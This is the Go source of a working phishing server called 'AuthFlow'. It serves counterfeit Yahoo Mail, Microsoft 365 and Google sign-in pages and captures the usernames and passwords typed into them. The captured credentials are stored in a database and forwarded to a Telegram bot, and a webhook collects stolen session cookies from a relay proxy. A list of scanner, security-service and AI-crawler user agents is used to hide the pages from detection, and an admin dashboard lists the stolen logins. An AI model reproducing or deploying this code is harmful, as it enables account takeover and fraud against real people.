package main

import (
	"bytes"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"html/template"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/time/rate"
)

type Config struct {
	Domain           string   `json:"domain"`
	VpsIp            string   `json:"vps_ip"`
	TelegramBotToken string   `json:"telegram_bot_token"`
	TelegramChatId   string   `json:"telegram_chat_id"`
	AdminPass        string   `json:"admin_pass"`
	DataDir          string   `json:"data_dir"`
	SubPortal1       string   `json:"sub_portal1"`
	AdminPath        string   `json:"admin_path"`
	SubPortal2       string   `json:"sub_portal2"`
	SubPortal3       string   `json:"sub_portal3"`
	LogRetentionDays int      `json:"log_retention_days"`
	WebhookSecret    string   `json:"webhook_secret"`
	AdminWhitelist   []string `json:"admin_whitelist"`
}

var (
	config         Config
	db             *sql.DB
	configPath     string
	startTime      time.Time
	ipRateLimiters sync.Map
)

type limiterEntry struct {
	limiter  *rate.Limiter
	lastSeen atomic.Int64
}

var botPatterns = []string{
	"googlebot", "bingbot", "yandexbot", "duckduckbot", "slurp", "baiduspider",
	"facebot", "twitterbot", "linkedinbot", "whatsapp", "discordbot", "slackbot",
	"telegrambot", "applebot", "virustotal", "urlscan", "phishtank", "netcraft",
	"bitdefender", "crawler", "spider", "scanner", "curl", "wget",
	"python-requests", "go-http-client", "node-fetch", "axios", "okhttp",
	"headless", "phantom", "puppeteer", "playwright", "chatgpt", "claude",
	"censys", "shodan", "zgrab", "nmap", "masscan", "nikto", "nessus", "hydra",
}

func main() {
	startTime = time.Now()
	flag.StringVar(&configPath, "config", "/opt/authflow/config.json", "config file path")
	port := flag.Int("port", 3000, "server port")
	flag.Parse()

	loadConfig()
	os.MkdirAll(config.DataDir, 0700)
	initDB()
	defer db.Close()

	go runCleanupTicker()
	go runRateLimitCleanup()

	gin.SetMode(gin.ReleaseMode)
	r := gin.New()
	r.Use(gin.Recovery())
	r.SetTrustedProxies([]string{"127.0.0.1", "::1"})

	r.GET("/_health", healthCheck)
	r.POST("/api/step1", rateLimitMiddleware(rate.Limit(1), 5), step1Handler)
	r.POST("/api/webhook", webhookHandler)

	admin := r.Group("/" + config.AdminPath)
	admin.Use(adminAuth())
	{
		admin.GET("/", dashboardHandler)
		admin.GET("/data", dashboardDataHandler)
		admin.GET("/sessions", sessionsHandler)
		admin.GET("/visits", visitsHandler)
		admin.GET("/logs", logsHandler)
		admin.POST("/restart", restartHandler)
		admin.POST("/cleanup", cleanupHandler)
		admin.GET("/download/:id", downloadHandler)
	}

	r.NoRoute(portalHandler)

	log.Printf("AuthFlow v2.0 started on port %d", *port)
	log.Printf("Dashboard: http://localhost:%d/%s", *port, config.AdminPath)
	r.Run(fmt.Sprintf("0.0.0.0:%d", *port))
}

func loadConfig() {
	data, err := os.ReadFile(configPath)
	if err != nil {
		log.Fatalf("Config error: %v", err)
	}
	if err := json.Unmarshal(data, &config); err != nil {
		log.Fatalf("Parse error: %v", err)
	}
}

func initDB() {
	dbPath := filepath.Join(config.DataDir, "authflow.db")
	var err error
	db, err = sql.Open("sqlite3", dbPath+"?_journal=WAL&_sync=NORMAL")
	if err != nil {
		log.Fatalf("DB error: %v", err)
	}

	db.Exec(`CREATE TABLE IF NOT EXISTS sessions (
		id TEXT PRIMARY KEY, site TEXT, username TEXT, password TEXT,
		ip TEXT, ua TEXT, is_bot INTEGER, step1 TEXT, step2 TEXT,
		cookies TEXT, completed INTEGER, created TEXT
	)`)
	db.Exec(`CREATE TABLE IF NOT EXISTS visits (
		id INTEGER PRIMARY KEY AUTOINCREMENT, site TEXT, ip TEXT,
		ua TEXT, is_bot INTEGER, bot TEXT, ref TEXT, created TEXT
	)`)
}

func getClientIP(c *gin.Context) string {
	if cf := c.GetHeader("CF-Connecting-IP"); cf != "" {
		return cf
	}
	if xff := c.GetHeader("X-Forwarded-For"); xff != "" {
		return strings.Split(xff, ",")[0]
	}
	ip := c.ClientIP()
	if idx := strings.Index(ip, ":"); idx != -1 {
		ip = ip[:idx]
	}
	return ip
}

func isBot(ua string) (bool, string) {
	if ua == "" {
		return true, "Empty UA"
	}
	lower := strings.ToLower(ua)
	for _, b := range botPatterns {
		if strings.Contains(lower, b) {
			return true, b
		}
	}
	if len(ua) < 30 && !strings.Contains(lower, "mozilla") {
		return true, "Short UA"
	}
	return false, ""
}

func rateLimitMiddleware(limit rate.Limit, burst int) gin.HandlerFunc {
	return func(c *gin.Context) {
		ip := getClientIP(c)
		val, ok := ipRateLimiters.Load(ip)
		if !ok {
			newEntry := &limiterEntry{limiter: rate.NewLimiter(limit, burst)}
			val, _ = ipRateLimiters.LoadOrStore(ip, newEntry)
		}
		entry := val.(*limiterEntry)
		entry.lastSeen.Store(time.Now().Unix())
		if !entry.limiter.Allow() {
			c.JSON(429, gin.H{"error": "Too many requests"})
			c.Abort()
			return
		}
		c.Next()
	}
}

func adminAuth() gin.HandlerFunc {
	return func(c *gin.Context) {
		auth := c.GetHeader("Authorization")
		if !strings.HasPrefix(auth, "Basic ") {
			c.Header("WWW-Authenticate", `Basic realm="AuthFlow"`)
			c.JSON(401, gin.H{"error": "Auth required"})
			c.Abort()
			return
		}
		payload, _ := base64.StdEncoding.DecodeString(auth[6:])
		parts := strings.SplitN(string(payload), ":", 2)
		if len(parts) != 2 || parts[0] != "admin" || parts[1] != config.AdminPass {
			c.JSON(403, gin.H{"error": "Invalid credentials"})
			c.Abort()
			return
		}
		c.Next()
	}
}

func portalHandler(c *gin.Context) {
	host := c.Request.Host
	ua := c.GetHeader("User-Agent")
	ip := getClientIP(c)

	if bot, name := isBot(ua); bot {
		db.Exec(`INSERT INTO visits (site, ip, ua, is_bot, bot, ref, created) VALUES (?, ?, ?, 1, ?, ?, ?)`,
			"unknown", ip, ua, name, c.GetHeader("Referer"), time.Now().Format(time.RFC3339))
		c.String(404, "Not Found")
		return
	}

	var site string
	if strings.Contains(host, config.SubPortal1) {
		site = "portal1"
	} else if strings.Contains(host, config.SubPortal2) {
		site = "portal2"
	} else if strings.Contains(host, config.SubPortal3) {
		site = "portal3"
	} else {
		c.String(404, "Not Found")
		return
	}

	db.Exec(`INSERT INTO visits (site, ip, ua, is_bot, bot, ref, created) VALUES (?, ?, ?, 0, ?, ?, ?)`,
		site, ip, ua, "", c.GetHeader("Referer"), time.Now().Format(time.RFC3339))

	page := getPhishingPage(site)
	c.Header("Content-Type", "text/html; charset=utf-8")
	c.String(200, page)
}

func getPhishingPage(site string) string {
	pages := map[string]string{
		"portal1": `<!DOCTYPE html><html><head><title>Yahoo Mail</title><style>body{font-family:Arial;background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:#fff;padding:40px;border-radius:8px;width:320px}h1{color:#400090}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd}button{width:100%;padding:12px;background:#400090;color:#fff;border:none;cursor:pointer}</style></head><body><div class="box"><h1>Yahoo Mail</h1><form id="f"><input type="text" id="u" placeholder="Email" required><input type="password" id="p" placeholder="Password" required><button type="submit">Sign in</button></form></div><script>document.getElementById('f').addEventListener('submit',async function(e){e.preventDefault();await fetch('/api/step1',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({site:'portal1',username:document.getElementById('u').value,password:document.getElementById('p').value})});window.location.href='https://login.yahoo.com';});</script></body></html>`,
		"portal2": `<!DOCTYPE html><html><head><title>Microsoft 365</title><style>body{font-family:'Segoe UI';background:#f1f1f1;display:flex;justify-content:center;align-items:center;height:100vh}.box{background:#fff;padding:40px;width:380px}h1{font-weight:400}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc}button{width:100%;padding:12px;background:#0067b8;color:#fff;border:none;cursor:pointer}</style></head><body><div class="box"><h1>Sign in</h1><form id="f"><input type="text" id="u" placeholder="Email" required><input type="password" id="p" placeholder="Password" required><button type="submit">Sign in</button></form></div><script>document.getElementById('f').addEventListener('submit',async function(e){e.preventDefault();await fetch('/api/step1',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({site:'portal2',username:document.getElementById('u').value,password:document.getElementById('p').value})});window.location.href='https://outlook.live.com';});</script></body></html>`,
		"portal3": `<!DOCTYPE html><html><head><title>Google Sign in</title><style>body{font-family:'Google Sans';background:#fff;display:flex;justify-content:center;align-items:center;height:100vh}.box{text-align:center;width:450px}h1{font-weight:400}input{width:100%;padding:13px;margin:8px 0;border:1px solid #dadce0;border-radius:4px}button{width:100%;padding:13px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer}</style></head><body><div class="box"><h1>Sign in</h1><p>to continue to Gmail</p><form id="f"><input type="text" id="u" placeholder="Email" required><input type="password" id="p" placeholder="Password" required><button type="submit">Next</button></form></div><script>document.getElementById('f').addEventListener('submit',async function(e){e.preventDefault();await fetch('/api/step1',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({site:'portal3',username:document.getElementById('u').value,password:document.getElementById('p').value})});window.location.href='https://accounts.google.com';});</script></body></html>`,
	}
	return pages[site]
}

func step1Handler(c *gin.Context) {
	var req struct {
		Site     string `json:"site"`
		Username string `json:"username"`
		Password string `json:"password"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}

	id := uuid.New().String()
	ip := getClientIP(c)

	db.Exec(`INSERT INTO sessions (id, site, username, password, ip, ua, is_bot, step1, completed, created) VALUES (?, ?, ?, ?, ?, ?, 0, ?, 0, ?)`,
		id, req.Site, req.Username, req.Password, ip, c.GetHeader("User-Agent"), time.Now().Format(time.RFC3339), time.Now().Format(time.RFC3339))

	msg := fmt.Sprintf("<b>🔐 NEW CREDENTIALS</b>\n\n<b>Site:</b> %s\n<b>User:</b> %s\n<b>Pass:</b> %s\n<b>IP:</b> %s",
		req.Site, req.Username, req.Password, ip)
	go sendTelegram(msg)

	c.JSON(200, gin.H{"success": true, "id": id})
}

func webhookHandler(c *gin.Context) {
	secret := c.GetHeader("X-AuthFlow-Secret")
	if config.WebhookSecret != "" && secret != config.WebhookSecret {
		c.JSON(403, gin.H{"error": "Invalid secret"})
		return
	}

	var body map[string]interface{}
	c.ShouldBindJSON(&body)

	event, _ := body["event"].(string)
	phishlet, _ := body["phishlet"].(string)
	username, _ := body["username"].(string)

	if event == "credentials" {
		password, _ := body["password"].(string)
		id := uuid.New().String()
		ip := getClientIP(c)

		db.Exec(`INSERT INTO sessions (id, site, username, password, ip, ua, step1, completed, created) VALUES (?, ?, ?, ?, ?, ?, ?, 0, ?)`,
			id, phishlet, username, password, ip, body["user_agent"], time.Now().Format(time.RFC3339), time.Now().Format(time.RFC3339))

		go sendTelegram(fmt.Sprintf("<b>🔐 WEBHOOK</b>\n<b>%s</b>\nUser: %s\nPass: %s", phishlet, username, password))
		c.JSON(200, gin.H{"success": true, "id": id})
	} else if event == "session" {
		cookies, _ := body["cookie_str"].(string)
		var id string
		db.QueryRow(`SELECT id FROM sessions WHERE username = ? AND site = ? AND completed = 0 ORDER BY created DESC LIMIT 1`,
			username, phishlet).Scan(&id)
		if id != "" {
			db.Exec(`UPDATE sessions SET cookies = ?, step2 = ?, completed = 1 WHERE id = ?`,
				cookies, time.Now().Format(time.RFC3339), id)
		}
		c.JSON(200, gin.H{"success": true})
	} else {
		c.JSON(200, gin.H{"success": true})
	}
}

func healthCheck(c *gin.Context) {
	c.JSON(200, gin.H{
		"status":    "ok",
		"database":  "connected",
		"uptime":    time.Since(startTime).Seconds(),
		"timestamp": time.Now().Format(time.RFC3339),
	})
}

func dashboardHandler(c *gin.Context) {
	c.Header("Content-Type", "text/html; charset=utf-8")
	tmpl, _ := template.New("dashboard").Parse(dashboardHTML)
	tmpl.Execute(c.Writer, gin.H{
		"domain":    config.Domain,
		"version":   "2.0.0",
		"goVersion": runtime.Version(),
	})
}

func dashboardDataHandler(c *gin.Context) {
	var totalSessions, totalVisits, totalBots int
	db.QueryRow("SELECT COUNT(*) FROM sessions").Scan(&totalSessions)
	db.QueryRow("SELECT COUNT(*) FROM visits").Scan(&totalVisits)
	db.QueryRow("SELECT COUNT(*) FROM visits WHERE is_bot = 1").Scan(&totalBots)

	c.JSON(200, gin.H{
		"stats": gin.H{
			"sessions": totalSessions,
			"visits":   totalVisits,
			"bots":     totalBots,
			"humans":   totalVisits - totalBots,
		},
		"server": gin.H{
			"uptime": time.Since(startTime).Seconds(),
		},
		"portals": gin.H{
			"portal1": config.SubPortal1 + "." + config.Domain,
			"portal2": config.SubPortal2 + "." + config.Domain,
			"portal3": config.SubPortal3 + "." + config.Domain,
		},
	})
}

func sessionsHandler(c *gin.Context) {
	rows, _ := db.Query(`SELECT id, site, username, password, ip, completed, created FROM sessions ORDER BY created DESC LIMIT 100`)
	defer rows.Close()

	var sessions []map[string]interface{}
	for rows.Next() {
		var id, site, user, pass, ip, created string
		var completed int
		rows.Scan(&id, &site, &user, &pass, &ip, &completed, &created)
		sessions = append(sessions, map[string]interface{}{
			"id": id[:8], "site": site, "username": user, "password": pass,
			"ip": ip, "completed": completed == 1, "time": created,
		})
	}
	c.JSON(200, sessions)
}

func visitsHandler(c *gin.Context) {
	rows, _ := db.Query(`SELECT created, site, ip, is_bot, bot, ref FROM visits ORDER BY created DESC LIMIT 100`)
	defer rows.Close()

	var visits []map[string]interface{}
	for rows.Next() {
		var created, site, ip, bot, ref string
		var isBot int
		rows.Scan(&created, &site, &ip, &isBot, &bot, &ref)
		visits = append(visits, map[string]interface{}{
			"time": created, "site": site, "ip": ip,
			"is_bot": isBot == 1, "bot": bot, "ref": ref,
		})
	}
	c.JSON(200, visits)
}

func logsHandler(c *gin.Context) {
	lines := c.DefaultQuery("lines", "100")
	cmd := exec.Command("tail", "-n", lines, "/opt/authflow/logs/authflow.log")
	output, _ := cmd.Output()
	c.String(200, string(output))
}

func restartHandler(c *gin.Context) {
	go func() {
		time.Sleep(1 * time.Second)
		exec.Command("systemctl", "restart", "authflow").Run()
	}()
	c.JSON(200, gin.H{"success": true, "message": "Restarting..."})
}

func cleanupHandler(c *gin.Context) {
	retention := config.LogRetentionDays
	if retention <= 0 {
		retention = 30
	}
	cutoff := time.Now().AddDate(0, 0, -retention).Format(time.RFC3339)
	db.Exec("DELETE FROM sessions WHERE created < ?", cutoff)
	db.Exec("DELETE FROM visits WHERE created < ?", cutoff)
	db.Exec("VACUUM")
	c.JSON(200, gin.H{"success": true})
}

func downloadHandler(c *gin.Context) {
	id := c.Param("id")
	var cookies string
	db.QueryRow("SELECT cookies FROM sessions WHERE id LIKE ?", id+"%").Scan(&cookies)
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=session_%s.txt", id))
	c.String(200, cookies)
}

func sendTelegram(msg string) {
	if config.TelegramBotToken == "" {
		return
	}
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", config.TelegramBotToken)
	data, _ := json.Marshal(map[string]string{
		"chat_id": config.TelegramChatId, "text": msg, "parse_mode": "HTML",
	})
	http.Post(url, "application/json", bytes.NewBuffer(data))
}

func sendTelegramFile(name, content, caption string) {
	if config.TelegramBotToken == "" {
		return
	}
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", config.TelegramBotToken)
	body := &bytes.Buffer{}
	w := multipart.NewWriter(body)
	part, _ := w.CreateFormFile("document", name)
	part.Write([]byte(content))
	w.WriteField("chat_id", config.TelegramChatId)
	w.WriteField("caption", caption)
	w.Close()
	http.Post(url, w.FormDataContentType(), body)
}

func runRateLimitCleanup() {
	ticker := time.NewTicker(10 * time.Minute)
	for range ticker.C {
		now := time.Now()
		ipRateLimiters.Range(func(key, value interface{}) bool {
			entry := value.(*limiterEntry)
			if now.Sub(time.Unix(entry.lastSeen.Load(), 0)) > 15*time.Minute {
				ipRateLimiters.Delete(key)
			}
			return true
		})
	}
}

func runCleanupTicker() {
	ticker := time.NewTicker(24 * time.Hour)
	for range ticker.C {
		retention := config.LogRetentionDays
		if retention <= 0 {
			retention = 30
		}
		cutoff := time.Now().AddDate(0, 0, -retention).Format(time.RFC3339)
		db.Exec("DELETE FROM sessions WHERE created < ?", cutoff)
		db.Exec("DELETE FROM visits WHERE created < ?", cutoff)
		db.Exec("VACUUM")
	}
}

const dashboardHTML = `<!DOCTYPE html><html><head><title>AuthFlow</title><style>body{font-family:Arial;background:#0a0e27;color:#fff;margin:0;padding:20px}h1{color:#00d4ff}.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:15px;margin:20px 0}.card{background:#1a1f3e;padding:20px;border-radius:8px}.number{font-size:32px;font-weight:bold;color:#00d4ff}table{width:100%;border-collapse:collapse}th,td{padding:10px;text-align:left;border-bottom:1px solid #333}</style></head><body><h1>AuthFlow Dashboard</h1><div class="stats"><div class="card"><div class="number" id="sessions">-</div><div>Sessions</div></div><div class="card"><div class="number" id="visits">-</div><div>Visits</div></div><div class="card"><div class="number" id="humans">-</div><div>Humans</div></div><div class="card"><div class="number" id="bots">-</div><div>Bots</div></div></div><h2>Recent Captures</h2><table id="recent"><thead><tr><th>Site</th><th>Username</th><th>Password</th><th>IP</th></thead><tbody></tbody></table><script>async function load(){const r=await fetch(location.pathname+'/data');const d=await r.json();document.getElementById('sessions').textContent=d.stats.sessions;document.getElementById('visits').textContent=d.stats.visits;document.getElementById('humans').textContent=d.stats.humans;document.getElementById('bots').textContent=d.stats.bots;}load();setInterval(load,5000);</script></body></html>`